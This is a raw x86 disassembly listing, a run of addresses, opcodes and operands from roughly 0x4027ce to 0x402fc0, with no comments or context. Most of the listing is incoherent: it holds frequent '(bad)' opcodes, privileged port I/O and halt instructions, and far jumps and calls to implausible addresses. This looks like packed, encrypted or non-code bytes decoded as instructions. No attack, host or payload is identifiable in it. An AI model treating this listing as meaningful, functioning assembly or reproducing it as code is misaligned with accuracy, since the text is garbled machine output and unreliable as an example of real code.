  4027ce:	jo     0x402765
  4027d0:	or     eax,0x3296d30c
  4027d5:	(bad)  
  4027d6:	rol    edx,1
  4027d8:	or     al,0x71
  4027da:	push   ebx
  4027db:	dec    ebx
  4027dc:	pusha  
  4027dd:	xchg   DWORD PTR [edx+0x3d022eaa],edi
  4027e3:	xchg   edx,eax
  4027e4:	popf   
  4027e5:	out    dx,eax
  4027e6:	jle    0x4027f9
  4027e8:	xchg   esp,eax
  4027e9:	jg     0x402817
  4027eb:	je     0x402849
  4027ed:	cmp    eax,0x7415118e
  4027f2:	push   edi
  4027f3:	sub    eax,0xeff55f05
  4027f8:	mov    al,0x1e
  4027fa:	sub    eax,0x483d2587
  4027ff:	je     0x40284f
  402801:	jmp    0x402863
  402803:	add    eax,0x833ff271
  402808:	call   0x95ab9a0f
  40280d:	out    dx,eax
  40280e:	(bad)  
  40280f:	ss je  0x402842
  402812:	jmp    0x402866
  402814:	cmp    eax,0x74115396
  402819:	cmp    eax,0x442e932d
  40281e:	adc    eax,DWORD PTR [edi+edi*8]
  402821:	call   esi
  402823:	jge    0x402849
  402825:	jmp    0x402861
  402827:	sub    eax,0x4e2f1dfd
  40282c:	cmp    eax,0x2ceb2674
  402831:	mov    al,0xc8
  402833:	jmp    0x40285f
  402835:	mov    al,0xc9
  402837:	jmp    0x40285f
  402839:	mov    al,0xcd
  40283b:	jmp    0x40283c
  40283d:	(bad)  
  40283e:	(bad)  
  40283f:	sti    
  402840:	and    dh,BYTE PTR [eax+0x1e1eebcf]
  402846:	sbb    dh,BYTE PTR [eax-0x4fe91429]
  40284c:	into   
  40284d:	jmp    0x402861
  40284f:	mov    al,0xd8
  402851:	jmp    0x402861
  402853:	mov    al,0xda
  402855:	jmp    0x402861
  402857:	mov    al,0xd9
  402859:	jmp    0x402861
  40285b:	mov    al,0xca
  40285d:	ss push 0x60fc0070
  402863:	call   DWORD PTR [ecx+0x32200c52]
  402869:	test   al,0x85
  40286b:	jns    0x4028ca
  40286d:	jle    0x4027fe
  40286f:	ja     0x4028a9
  402871:	push   es
  402872:	rcl    BYTE PTR [esi],0x85
  402875:	jge    0x7bd18bad
  40287b:	sbb    al,0x7f
  40287d:	je     0x4028f0
  40287f:	push   ecx
  402880:	stos   DWORD PTR es:[edi],eax
  402881:	cmp    bl,BYTE PTR [edx+0x86aa564]
  402887:	mov    ?,WORD PTR [eax]
  402889:	pop    esp
  40288a:	cwde   
  40288b:	cmp    eax,DWORD PTR [edx]
  40288d:	push   ebx
  40288e:	hlt    
  40288f:	jg     0x402892
  402891:	push   ebx
  402892:	adc    al,0x8b
  402894:	inc    ebx
  402895:	sbb    BYTE PTR [ebp+ebx*1-0xb],dh
  402899:	cli    
  40289a:	cmp    edi,DWORD PTR [ebx-0x764b8977]
  4028a0:	fdivr  st,st(1)
  4028a2:	out    dx,al
  4028a3:	push   ss
  4028a4:	inc    edx
  4028a5:	sti    
  4028a6:	and    eax,0xac3a765c
  4028ab:	out    dx,al
  4028ac:	mov    ecx,DWORD PTR ds:0x56964204
  4028b2:	sbb    DWORD PTR [eax-0x7e46f827],edi
  4028b8:	or     eax,0xa145135
  4028bd:	mov    ecx,0x403860b8
  4028c2:	xor    edi,edi
  4028c4:	scas   al,BYTE PTR es:[edi]
  4028c5:	xchg   edx,eax
  4028c6:	ja     0x402929
  4028c8:	cmp    BYTE PTR [edx+eax*2+0xa],dl
  4028cc:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4028cd:	fmul   st(0),st
  4028cf:	dec    eax
  4028d0:	call   0xfaccf695
  4028d5:	mov    DWORD PTR [eax+0x8],ebp
  4028d8:	mov    ds:0xa13f4834,eax
  4028dd:	adc    eax,0x1df02ae1
  4028e2:	sbb    BYTE PTR [edx+ecx*2],0x39
  4028e6:	enter  0xb6,0x56
  4028ea:	or     BYTE PTR [eax-0xa],0xbf
  4028ee:	repnz or DWORD PTR [ebx+0x874fff9],eax
  4028f5:	cmp    DWORD PTR [ecx],eax
  4028f7:	jne    0x4028ee
  4028f9:	and    ah,bh
  4028fb:	cli    
  4028fc:	jge    0x4028d2
  4028fe:	and    DWORD PTR [edi-0x42],ebp
  402901:	xor    BYTE PTR [esi+eax*2-0x74ab9df8],bh
  402908:	pop    esi
  402909:	(bad)  
  40290a:	xor    BYTE PTR [eax],al
  40290c:	aam    0x78
  40290e:	add    BYTE PTR fs:[ebp-0x6a88f7c7],0x26
  402916:	xchg   BYTE PTR [ebx],bl
  402918:	dec    ebx
  402919:	mov    DWORD PTR [esi],esi
  40291b:	jnp    0x40294c
  40291d:	mov    ebp,0xd84424b5
  402922:	cmp    BYTE PTR [edi+0x3],dl
  402925:	call   DWORD PTR [ebp-0x8]
  402928:	xor    al,0xe0
  40292a:	adc    BYTE PTR [edi],0x61
  40292d:	jg     0x402914
  40292f:	adc    eax,0x8e8714eb
  402934:	shr    BYTE PTR [ecx],1
  402936:	sbb    ebx,DWORD PTR [esi+0x29]
  402939:	sub    al,0x9
  40293b:	pop    esp
  40293c:	adc    edx,DWORD PTR [ebp-0x202cd1ba]
  402942:	mov    edi,0x5cb03047
  402947:	jp     0x402911
  402949:	xor    ecx,esp
  40294b:	cmc    
  40294c:	cmp    esi,ebx
  40294e:	push   0xfbfb1f90
  402953:	fadd   DWORD PTR [eax+ebx*8]
  402956:	(bad)  
  402957:	inc    ebx
  402958:	mov    DWORD PTR [edi+0xc],ebx
  40295b:	fistp  QWORD PTR [ebx]
  40295d:	repz jg 0x402946
  402960:	inc    edx
  402961:	mov    ds:0x5c703d3,al
  402966:	adc    eax,0xd4fcea68
  40296b:	out    0x69,eax
  40296d:	adc    bl,BYTE PTR [eax]
  40296f:	jo     0x402914
  402971:	cmp    BYTE PTR [ecx+0x78326d3c],ah
  402977:	add    DWORD PTR [eax+0x15],esp
  40297a:	inc    eax
  40297b:	pminsw mm4,QWORD PTR [ebx-0x16e44ad4]
  402982:	fistp  QWORD PTR [edx]
  402984:	jb     0x4029ae
  402986:	in     al,0xc6
  402988:	add    eax,0x9c9fac34
  40298d:	ret    
  40298e:	mov    cs,WORD PTR [eax-0x45d11641]
  402994:	mov    edi,DWORD PTR [eax+ebx*1]
  402997:	lea    esi,[eax+ebx*1+0x4]
  40299b:	call   0x180b:0xbffea116
  4029a2:	sbb    BYTE PTR [ecx],al
  4029a4:	fidiv  DWORD PTR [esi]
  4029a6:	inc    esi
  4029a7:	mov    WORD PTR [ebx+0x754f08c6],es
  4029ad:	jmp    0x402a0d
  4029af:	pop    edi
  4029b0:	shr    DWORD PTR [bp-0x48],cl
  4029b4:	fimul  DWORD PTR [edi+0x3]
  4029b7:	call   0xe30c:0x4c1a0489
  4029be:	int    0xe
  4029c0:	dec    edx
  4029c1:	in     al,dx
  4029c2:	retf   
  4029c3:	push   0x8b10b150
  4029c8:	sbb    eax,0x963800ff
  4029cd:	dec    esi
  4029ce:	cwde   
  4029cf:	mov    edi,0xfff799de
  4029d4:	add    dl,0x30
  4029d7:	jl     0x40297d
  4029d9:	mov    ebp,0x88c1784b
  4029de:	adc    al,0x6
  4029e0:	es mov ebx,0x49d88bfb
  4029e6:	push   es
  4029e7:	jne    0x402a48
  4029e9:	or     DWORD PTR [eax-0x5ee34e25],esp
  4029ef:	add    al,0x57
  4029f1:	rol    BYTE PTR [eax+0xc],1
  4029f4:	push   0x7f
  4029f6:	jmp    0xccc8bc85
  4029fb:	fisttp DWORD PTR [edx+0x3e1e52d9]
  402a01:	jbe    0x402a1f
  402a03:	mov    ds:0xe61240cb,al
  402a08:	lahf   
  402a09:	sub    al,BYTE PTR [edi-0x798ff4fb]
  402a0f:	out    dx,eax
  402a10:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  402a11:	neg    eax
  402a13:	sbb    eax,eax
  402a15:	inc    eax
  402a16:	mov    bh,0x5f
  402a18:	sbb    BYTE PTR [esi],bh
  402a1a:	adc    al,0xff
  402a1c:	in     eax,dx
  402a1d:	inc    edx
  402a1e:	pop    ss
  402a1f:	fnstenv [edi+0x1c]
  402a22:	add    al,0x34
  402a24:	aaa    
  402a25:	mov    ecx,0x58a5d00b
  402a2a:	leave  
  402a2b:	mov    bh,0x52
  402a2d:	ror    DWORD PTR [edi+edi*8+0x51],1
  402a31:	sahf   
  402a32:	inc    esp
  402a33:	jns    0x402a8c
  402a35:	and    ax,0xa49b
  402a3a:	sar    BYTE PTR ds:0x14801818,cl
  402a40:	cmp    DWORD PTR ds:0xa2ba6220,0xffffff95
  402a47:	ds aam 0xb
  402a4a:	mov    eax,0xa30843c
  402a4f:	mov    ds:0xa2247e0d,eax
  402a54:	loope  0x402ac0
  402a56:	push   ds
  402a57:	push   0xf3f56a75
  402a5c:	and    DWORD PTR [edi],edi
  402a5e:	in     al,dx
  402a5f:	push   ecx
  402a60:	pop    esp
  402a61:	(bad)  
  402a62:	jl     0x402a99
  402a64:	add    ch,BYTE PTR [eax-0x50]
  402a67:	cmp    eax,DWORD PTR [eax+0xe]
  402a6a:	sbb    BYTE PTR [ebx+0x3b],ch
  402a6d:	pop    edx
  402a6e:	ret    
  402a6f:	mov    esi,0x4669502c
  402a74:	into   
  402a75:	dec    esp
  402a76:	aaa    
  402a77:	mov    ebx,0x7d1260
  402a7c:	cmp    edx,DWORD PTR [eax+edi*4+0x78300d00]
  402a83:	push   ss
  402a84:	enter  0xda0d,0xd9
  402a88:	push   ecx
  402a89:	jo     0x402a86
  402a8b:	pusha  
  402a8c:	cmp    DWORD PTR [ebx+0x2640be67],0xffffff80
  402a93:	jnp    0x402abd
  402a95:	ins    BYTE PTR es:[edi],dx
  402a96:	push   ss
  402a97:	cmp    DWORD PTR [esi],0x1b
  402a9a:	and    esi,eax
  402a9c:	add    esi,esp
  402a9e:	push   es
  402a9f:	cmp    BYTE PTR [eax+0x6],dh
  402aa2:	jmp    DWORD PTR [eax]
  402aa4:	js     0x402aaa
  402aa6:	inc    esp
  402aa7:	clc    
  402aa8:	in     al,0xef
  402aaa:	inc    edx
  402aab:	jae    0x402a9c
  402aad:	jge    0x402a96
  402aaf:	sbb    DWORD PTR [edx],esi
  402ab1:	mov    gs,WORD PTR [edx]
  402ab3:	cwde   
  402ab4:	or     BYTE PTR [ebx],ch
  402ab6:	cmp    al,0xa3
  402ab8:	daa    
  402ab9:	push   0xffffffc7
  402abb:	dec    edi
  402abc:	mov    ebp,0xe7502f6
  402ac1:	ds add bl,ch
  402ac4:	mov    ds:0x76250c43,al
  402ac9:	adc    BYTE PTR [ebx+0x760130df],dl
  402acf:	or     DWORD PTR [edx+0x7b],edx
  402ad2:	adc    cl,dh
  402ad4:	push   es
  402ad5:	inc    edx
  402ad6:	and    DWORD PTR [esp+ebx*1],esi
  402ad9:	cmc    
  402ada:	inc    ecx
  402adb:	or     BYTE PTR [ebx-0x3b07ca95],0x5f
  402ae2:	push   ss
  402ae3:	jne    0x402af5
  402ae5:	cmp    esi,DWORD PTR [ebp+0x4]
  402ae8:	je     0x402af4
  402aea:	push   esi
  402aeb:	push   esi
  402aec:	cmp    eax,0xb4b9daac
  402af1:	shr    BYTE PTR [ebp+0x4],cl
  402af4:	jne    0x402af9
  402af6:	mov    dl,BYTE PTR [eax]
  402af8:	fiadd  WORD PTR ds:0x5448e297
  402afe:	hlt    
  402aff:	out    dx,al
  402b00:	sahf   
  402b01:	adc    BYTE PTR [edi],al
  402b03:	scas   al,BYTE PTR es:[edi]
  402b04:	pop    ebx
  402b05:	sub    bl,ch
  402b07:	adc    DWORD PTR [ecx-0x792e1651],esp
  402b0d:	outs   dx,BYTE PTR ds:[esi]
  402b0e:	loope  0x402a9c
  402b10:	mov    eax,DWORD PTR [ebx]
  402b12:	and    bl,bh
  402b14:	shl    DWORD PTR [esi],cl
  402b16:	or     eax,0x2be22fdc
  402b1b:	cmc    
  402b1c:	sub    eax,0xb05745a3
  402b21:	adc    al,0x54
  402b23:	ds cmc 
  402b25:	ret    
  402b26:	nop
  402b27:	pop    DWORD PTR ds:0x128be9d6
  402b2d:	sar    BYTE PTR [edi-0x3828a803],cl
  402b33:	pop    esp
  402b34:	ror    BYTE PTR [edx-0x8],0x49
  402b38:	jl     0x402b4a
  402b3a:	lock dec DWORD PTR [esi*2+0x428d500a]
  402b42:	clc    
  402b43:	(bad)  
  402b44:	push   eax
  402b45:	rcr    DWORD PTR [ecx],0x87
  402b48:	push   ss
  402b49:	dec    edi
  402b4a:	in     al,dx
  402b4b:	jb     0x402b15
  402b4d:	out    dx,eax
  402b4e:	(bad)  
  402b4f:	mov    edx,DWORD PTR [ebx]
  402b51:	push   edx
  402b52:	sbb    al,bh
  402b54:	add    ecx,DWORD PTR [esi]
  402b56:	or     BYTE PTR [ecx-0x3c],dl
  402b59:	pop    ebx
  402b5a:	pop    ss
  402b5b:	and    ebx,edx
  402b5d:	dec    esi
  402b5e:	jne    0x402b3a
  402b60:	outs   dx,BYTE PTR ds:[esi]
  402b61:	add    edx,DWORD PTR [edx+eiz*8]
  402b64:	idiv   DWORD PTR [esi+0x42]
  402b67:	inc    ecx
  402b68:	jg     0x402b84
  402b6a:	or     BYTE PTR [edx+0x31],al
  402b6d:	in     al,dx
  402b6e:	lods   eax,DWORD PTR ds:[esi]
  402b6f:	mov    ch,0x7d
  402b71:	sub    eax,0x58c2896c
  402b76:	push   ss
  402b77:	dec    eax
  402b78:	cld    
  402b79:	cdq    
  402b7a:	pop    edx
  402b7b:	pop    eax
  402b7c:	jmp    0x402b82
  402b7e:	jbe    0x402b72
  402b80:	add    eax,0x876cd758
  402b85:	not    DWORD PTR [edi+edx*4]
  402b88:	xchg   DWORD PTR [edx],ecx
  402b8a:	call   DWORD PTR [edi]
  402b8c:	inc    edx
  402b8d:	lods   eax,DWORD PTR ds:[esi]
  402b8e:	jle    0x402be3
  402b90:	out    0xc0,al
  402b92:	jle    0x402bb8
  402b94:	push   eax
  402b95:	add    eax,0xa
  402b98:	pop    ss
  402b99:	icebp  
  402b9a:	mov    ebp,0xfee083f1
  402b9f:	push   eax
  402ba0:	sub    ebx,DWORD PTR [edx+0x66]
  402ba3:	mov    DWORD PTR [edx+eax*1+0x72],0x37c0281e
  402bab:	or     BYTE PTR es:[edx-0x77],bl
  402baf:	push   eax
  402bb0:	cld    
  402bb1:	xor    al,0xf8
  402bb3:	jne    0x402bad
  402bb5:	shl    DWORD PTR [ebx-0x6770c1bc],0x89
  402bbc:	iret   
  402bbd:	mov    eax,edi
  402bbf:	rol    DWORD PTR [edx-0x6d0d879],0x89
  402bc6:	(bad)  
  402bc7:	jmp    0x5739:0xf0893e09
  402bce:	mov    ds:0x689eb3f,al
  402bd3:	sub    al,0xa8
  402bd5:	mov    DWORD PTR [ebx],edi
  402bd7:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  402bd8:	push   esi
  402bd9:	fsub   st(6),st
  402bdb:	cli    
  402bdc:	mov    BYTE PTR [esi+0x52],ah
  402bdf:	push   eax
  402be0:	push   es
  402be1:	or     BYTE PTR [eax+0x51],dl
  402be4:	adc    BYTE PTR [ecx+0xb4265b8],ah
  402bea:	dec    esp
  402beb:	sub    ecx,ecx
  402bed:	sub    al,0x44
  402bef:	fsub   DWORD PTR [ebx-0x47]
  402bf2:	ficom  DWORD PTR [esi]
  402bf4:	aaa    
  402bf5:	or     al,0xa7
  402bf7:	add    esp,0x382ae851
  402bfd:	cmp    bh,0x3a
  402c00:	les    eax,FWORD PTR [edx-0x7448020f]
  402c06:	in     eax,dx
  402c07:	xchg   al,bh
  402c09:	fdivr  DWORD PTR [edi+0x9]
  402c0c:	icebp  
  402c0d:	(bad)  
  402c0e:	jmp    0x402c6f
  402c10:	lea    ebp,[esi+0x1]
  402c13:	cmp    ebp,0xf01e07ff
  402c19:	ret    0x2642
  402c1c:	sub    BYTE PTR [esi+0x2a],dl
  402c1f:	(bad)  
  402c20:	mov    edx,0x20f068c7
  402c25:	hlt    
  402c26:	aaa    
  402c27:	enter  0x7cce,0xfd
  402c2b:	fstp   QWORD PTR ds:0xc77b0f89
  402c31:	mov    ecx,ebx
  402c33:	and    eax,0x8b2ceb98
  402c38:	fld    QWORD PTR [ebx]
  402c3a:	fcomi  st,st(6)
  402c3c:	pop    esp
  402c3d:	aad    0xe7
  402c3f:	sbb    al,0xd3
  402c41:	xor    dl,BYTE PTR [edx+ebx*8]
  402c44:	pop    es
  402c45:	sbb    ebx,DWORD PTR gs:[edi-0x78]
  402c49:	or     DWORD PTR [ebx+0x7b],0x3d33027d
  402c50:	clc    
  402c51:	aam    0x83
  402c53:	sahf   
  402c54:	ret    
  402c55:	pop    edi
  402c56:	call   DWORD PTR [edx-0x77]
  402c59:	loop   0x402c14
  402c5b:	or     DWORD PTR [ebx-0x176432],ecx
  402c61:	popa   
  402c62:	xor    ecx,ecx
  402c64:	mov    ds:0xa3a5221,al
  402c69:	je     0x402c82
  402c6b:	cmp    cl,BYTE PTR [edx+0x1]
  402c6e:	xchg   esi,eax
  402c6f:	or     BYTE PTR [edx],al
  402c71:	je     0x402c2a
  402c73:	or     edi,DWORD PTR [edx]
  402c75:	call   0xeb74:0x83ca030b
  402c7c:	call   0xd1c92cc3
  402c81:	pop    edx
  402c82:	mov    ch,0x7f
  402c84:	push   cs
  402c85:	out    dx,al
  402c86:	sub    ecx,edx
  402c88:	jmp    0x2d9ff3ea
  402c8d:	push   edx
  402c8e:	cmp    sp,WORD PTR [eax+0x20]
  402c92:	jbe    0x402c8b
  402c94:	cld    
  402c95:	sahf   
  402c96:	or     BYTE PTR [eax+0x17],bl
  402c99:	or     al,BYTE PTR [esp+esi*2]
  402c9c:	push   cs
  402c9d:	push   es
  402c9e:	addr16 or bl,ch
  402ca1:	in     al,0x8
  402ca3:	(bad)  
  402ca4:	jl     0x402c9c
  402ca6:	mov    dl,0x2
  402ca8:	add    eax,0x2e767473
  402cad:	add    al,0x8a
  402caf:	or     al,BYTE PTR [edx-0x2c]
  402cb2:	mov    cl,BYTE PTR ds:0x57909367
  402cb8:	push   eax
  402cb9:	mov    edi,edx
  402cbb:	adc    dl,dh
  402cbd:	scas   al,BYTE PTR es:[edi]
  402cbe:	push   ebp
  402cbf:	jl     0x402c9a
  402cc1:	out    dx,eax
  402cc2:	sbb    cl,dl
  402cc4:	pop    eax
  402cc5:	add    ecx,eax
  402cc7:	pop    eax
  402cc8:	pop    edi
  402cc9:	xor    DWORD PTR [edi-0x21033dfb],edi
  402ccf:	inc    ebp
  402cd0:	or     ch,BYTE PTR [edi+ebp*2-0x3bf65d4]
  402cd7:	ret    
  402cd8:	xor    bh,BYTE PTR [edi]
  402cda:	sub    ebx,DWORD PTR [edx]
  402cdc:	jle    0x402cde
  402cde:	fimul  WORD PTR [edi]
  402ce0:	test   BYTE PTR [edx+0x1c83ff58],ah
  402ce6:	or     BYTE PTR [esi-0x3d],bh
  402ce9:	mov    edi,DWORD PTR [ecx-0x5e]
  402cec:	push   esi
  402ced:	cld    
  402cee:	add    edx,edi
  402cf0:	cmp    esi,ecx
  402cf2:	adc    al,0xd9
  402cf4:	push   es
  402cf5:	pop    ss
  402cf6:	(bad)  
  402cf7:	push   esi
  402cf8:	jle    0x402c85
  402cfa:	dec    esi
  402cfb:	and    al,0x13
  402cfd:	and    cl,BYTE PTR [ebp-0x655f6219]
  402d03:	js     0x402d32
  402d05:	call   0x61c7cc03
  402d0a:	adc    al,BYTE PTR [edx+0x608374ff]
  402d10:	cmp    edx,DWORD PTR [eax]
  402d12:	je     0x402d70
  402d14:	cmp    ecx,DWORD PTR [eax]
  402d16:	jbe    0x402cdd
  402d18:	frstor [edi]
  402d1a:	fidivr DWORD PTR [edi+0x2c]
  402d1d:	cld    
  402d1e:	sbb    al,0xe2
  402d20:	das    
  402d21:	dec    esp
  402d22:	scas   eax,DWORD PTR es:[edi]
  402d23:	ror    DWORD PTR [ecx-0x74376732],cl
  402d29:	cs jp  0x402d6f
  402d2c:	cld    
  402d2d:	add    eax,DWORD PTR [esi+0x69]
  402d30:	(bad)  
  402d31:	ins    BYTE PTR es:[edi],dx
  402d32:	mov    eax,ebx
  402d34:	mov    ecx,DWORD PTR [ebx-0x4b]
  402d37:	mov    dl,0xd9
  402d39:	out    dx,eax
  402d3a:	mov    edx,edi
  402d3c:	lds    eax,FWORD PTR [ebx]
  402d3e:	push   ebx
  402d3f:	sbb    eax,0x96881e58
  402d44:	fstp   st(5)
  402d46:	pop    ebx
  402d47:	cmp    cl,BYTE PTR [edi-0x8]
  402d4a:	mov    esp,ecx
  402d4c:	mov    edx,ecx
  402d4e:	jmp    0x570ab6f4
  402d53:	ins    BYTE PTR es:[edi],dx
  402d54:	mov    es,WORD PTR [ebx]
  402d56:	(bad)  
  402d57:	cmps   BYTE PTR ss:[esi],BYTE PTR es:[edi]
  402d59:	xor    edi,edi
  402d5b:	inc    esi
  402d5c:	xchg   esp,eax
  402d5d:	adc    al,0xef
  402d5f:	adc    BYTE PTR [eax+0x13],ch
  402d62:	cwde   
  402d63:	or     al,0x39
  402d65:	mov    esp,0xfc418bf2
  402d6a:	dec    edx
  402d6b:	sbb    DWORD PTR [esi+0x2ebc337],esi
  402d71:	push   es
  402d72:	sub    ecx,DWORD PTR [ecx]
  402d74:	add    ebx,DWORD PTR [esi]
  402d76:	cmp    edi,ecx
  402d78:	sbb    al,0x78
  402d7a:	add    eax,0x4a4cbbd8
  402d7f:	jne    0x402d6d
  402d81:	mov    ds:0x7728e617,al
  402d86:	cld    
  402d87:	inc    ebx
  402d88:	paddd  mm4,QWORD PTR [edi]
  402d8b:	jge    0x402dc9
  402d8d:	and    al,0xff
  402d8f:	aaa    
  402d90:	add    esi,DWORD PTR [edi]
  402d92:	dec    ebx
  402d93:	jmp    0x402d9d
  402d95:	and    edx,DWORD PTR [eax+0x7]
  402d98:	lahf   
  402d99:	push   ds
  402d9a:	mov    esi,0x189c445e
  402d9f:	mov    edx,esi
  402da1:	or     bl,BYTE PTR ss:[esi+0x617ce01]
  402da8:	lds    eax,FWORD PTR [eax+eiz*8-0x75168ab5]
  402daf:	dec    esi
  402db0:	or     al,0xcc
  402db2:	icebp  
  402db3:	cmovbe ecx,DWORD PTR [edx]
  402db6:	and    cl,BYTE PTR [edx+0x5a]
  402db9:	and    al,0x58
  402dbb:	lea    esp,[esp+edx*4]
  402dbe:	jmp    eax
  402dc0:	dec    ebx
  402dc1:	loope  0x402e2a
  402dc3:	mov    ebp,0xd039d946
  402dc8:	push   edi
  402dc9:	dec    DWORD PTR [ebx]
  402dcb:	mov    esi,0xd668e4a3
  402dd0:	imul   ecx,DWORD PTR [ebx-0x3a8742e],0x29
  402dd7:	shl    BYTE PTR [edi+0x2],1
  402dda:	add    edx,eax
  402ddc:	push   edx
  402ddd:	sub    al,bh
  402ddf:	jg     0x402da6
  402de1:	shr    edx,0xac
  402de4:	mov    ecx,DWORD PTR es:[esi]
  402de7:	mov    ebx,DWORD PTR [edi]
  402de9:	cmp    ecx,ebx
  402deb:	jne    0x402e45
  402ded:	dec    edx
  402dee:	je     0x402e05
  402df0:	fadd   DWORD PTR [edx+eax*4]
  402df3:	cmp    esi,eax
  402df5:	pushf  
  402df6:	mov    ah,0x18
  402df8:	dec    ebx
  402df9:	int3   
  402dfa:	add    edi,0x8
  402dfd:	ds mov edx,0xe2ed378e
  402e03:	jmp    0x402e0b
  402e05:	adc    al,0x4
  402e07:	add    al,0x5a
  402e09:	and    edx,0x54
  402e0c:	and    dl,BYTE PTR [edi+0x38]
  402e0f:	data16 fdivr QWORD PTR [esi+0x38174169]
  402e16:	std    
  402e17:	jne    0x402e53
  402e19:	or     al,0x10
  402e1b:	and    ebx,0x1bbfdf96
  402e21:	adc    DWORD PTR [eax+0xa],ecx
  402e24:	jo     0x402e4d
  402e26:	add    eax,eax
  402e28:	jmp    0x402e4d
  402e2a:	shr    ebx,0xef
  402e2d:	jg     0x402e1e
  402e2f:	mov    ebx,0x150cd41c
  402e34:	pop    edx
  402e35:	pusha  
  402e36:	adc    BYTE PTR [edx+0xc],bl
  402e39:	shr    ecx,0x10
  402e3c:	shr    ebx,0x10
  402e3f:	sbb    al,BYTE PTR [edx]
  402e41:	cmc    
  402e42:	sub    esp,DWORD PTR [ebp+0x32]
  402e45:	xlat   BYTE PTR ds:[ebx]
  402e46:	enter  0xc3,0xb8
  402e4a:	cmp    eax,0x3995a571
  402e4f:	lock sbb ah,bl
  402e52:	cmp    BYTE PTR [edx+esi*1+0x53],dh
  402e56:	mov    eax,0xde4ba45e
  402e5b:	lea    ebx,[esi+0x22935013]
  402e61:	xchg   ebp,eax
  402e62:	mov    ecx,0x2510586c
  402e67:	dec    eax
  402e68:	inc    eax
  402e69:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  402e6a:	int3   
  402e6b:	lods   eax,DWORD PTR ds:[esi]
  402e6c:	cmp    eax,DWORD PTR [esi]
  402e6e:	pop    ebx
  402e6f:	mov    eax,edx
  402e71:	xchg   edi,eax
  402e72:	xor    DWORD PTR [eax-0xbc400ff],esi
  402e78:	sub    eax,0x6afc588b
  402e7d:	es dec edx
  402e7f:	jl     0x402e9c
  402e81:	cmp    edx,ebx
  402e83:	jge    0x402ea4
  402e85:	sub    ebx,edx
  402e87:	or     BYTE PTR [eax],cl
  402e89:	push   ss
  402e8a:	adc    al,0x86
  402e8c:	sbb    DWORD PTR [edx+0x7f],eax
  402e8f:	adc    esi,ebp
  402e91:	push   0xfffffffb
  402e93:	jg     0x402e5f
  402e95:	repz mov eax,0xebd23111
  402e9b:	in     eax,0x89
  402e9d:	fldpi  
  402e9f:	jmp    0x402ec6
  402ea1:	cmp    BYTE PTR [eax+0x23],bh
  402ea4:	mov    al,ds:0x7c8c5b44
  402ea9:	inc    eax
  402eaa:	sbb    dh,BYTE PTR [ecx]
  402eac:	mov    edi,esi
  402eae:	(bad)  
  402eaf:	outs   dx,DWORD PTR ds:[esi]
  402eb0:	xchg   DWORD PTR [ebx-0xba803b1],ecx
  402eb6:	dec    edx
  402eb7:	js     0x402ed4
  402eb9:	mov    al,BYTE PTR [esi]
  402ebb:	inc    esi
  402ebc:	sar    BYTE PTR [esi+0x14],1
  402ebf:	xor    DWORD PTR [eax],eax
  402ec1:	fiadd  WORD PTR [edi-0x68]
  402ec4:	adc    BYTE PTR [ecx-0x752ec735],cl
  402eca:	mov    ebp,0xcc4f8a14
  402ecf:	sub    ah,0x5a
  402ed2:	mov    esi,0x50b4e064
  402ed7:	adc    BYTE PTR [esi+edi*8-0x8],dh
  402edb:	jmp    0x7348:0xa013416f
  402ee2:	rcl    BYTE PTR [eax+ecx*2+0xbc368e],1
  402ee9:	aas    
  402eea:	lods   al,BYTE PTR ds:[esi]
  402eeb:	and    eax,DWORD PTR [ebx+0x1d753478]
  402ef1:	sub    eax,0xffffffbc
  402ef4:	ret    0x7009
  402ef7:	or     BYTE PTR ds:0x7fe0b62a,0xe0
  402efe:	pop    eax
  402eff:	ins    BYTE PTR es:[edi],dx
  402f00:	mov    DWORD PTR [edx-0x35a3b572],esp
  402f06:	jo     0x402f04
  402f08:	(bad)  
  402f09:	hlt    
  402f0a:	jmp    0x402ef8
  402f0c:	rcl    BYTE PTR [edi],1
  402f0e:	xor    al,0x7d
  402f10:	rcr    dh,1
  402f12:	arpl   ax,dx
  402f14:	cli    
  402f15:	clc    
  402f16:	cmp    ecx,esi
  402f18:	jl     0x402ee4
  402f1a:	icebp  
  402f1b:	jae    0x402f1e
  402f1d:	add    DWORD PTR [edx],eax
  402f1f:	pop    edi
  402f20:	int    0xc3
  402f22:	xchg   edi,eax
  402f23:	clc    
  402f24:	inc    esp
  402f25:	je     0x402f7c
  402f27:	push   eax
  402f28:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  402f29:	cmp    al,0xba
  402f2b:	in     al,0x76
  402f2d:	add    BYTE PTR [ecx-0x6cf829f8],0x6
  402f34:	push   edx
  402f35:	mov    ebx,0x2feb80b4
  402f3a:	dec    esp
  402f3b:	pop    ds
  402f3c:	dec    DWORD PTR [esi]
  402f3e:	push   eax
  402f3f:	sub    eax,0x28580bbe
  402f44:	mov    bh,0xe7
  402f46:	in     eax,0xc
  402f48:	rol    BYTE PTR [edx],1
  402f4a:	out    dx,eax
  402f4b:	add    eax,0xcb3950e7
  402f50:	call   0x4b751a42
  402f55:	lahf   
  402f56:	jb     0x402f06
  402f58:	mov    esp,0x4ab1146b
  402f5d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  402f5e:	adc    edi,DWORD PTR ds:0x44e5e051
  402f64:	jno    0x402ee6
  402f66:	cld    
  402f67:	mov    al,ds:0xa8320701
  402f6c:	jmp    0x402fcb
  402f6e:	call   DWORD PTR [edx-0x17f88d19]
  402f74:	jle    0x402fa9
  402f76:	xchg   esp,eax
  402f77:	jmp    0x402fa3
  402f79:	mov    ebx,ebp
  402f7b:	enter  0x9c80,0x1
  402f7f:	add    esi,DWORD PTR [eax+esi*8]
  402f82:	call   0x4e894e36
  402f87:	xor    al,0xf0
  402f89:	mov    esi,0xcdff0cfe
  402f8e:	arpl   WORD PTR [eax],si
  402f90:	add    eax,0xcc2f504a
  402f95:	(bad)  
  402f96:	pop    edx
  402f97:	add    BYTE PTR [edx],0xcc
  402f9a:	lock push DWORD PTR [edx]
  402f9d:	mov    DWORD PTR [edx],eax
  402f9f:	and    edx,DWORD PTR [eax+0xc30ecf]
  402fa5:	inc    ecx
  402fa6:	sub    BYTE PTR [edi+0x3],al
  402fa9:	sbb    dl,BYTE PTR [esi]
  402fab:	mov    ch,0x9e
  402fad:	jmp    0xa:0x4870823
  402fb4:	mov    ds:0xe6a440e,al
  402fb9:	jo     0x40301f
  402fbb:	mov    edi,0xc8e840c2
  402fc0:	jae    0x403037
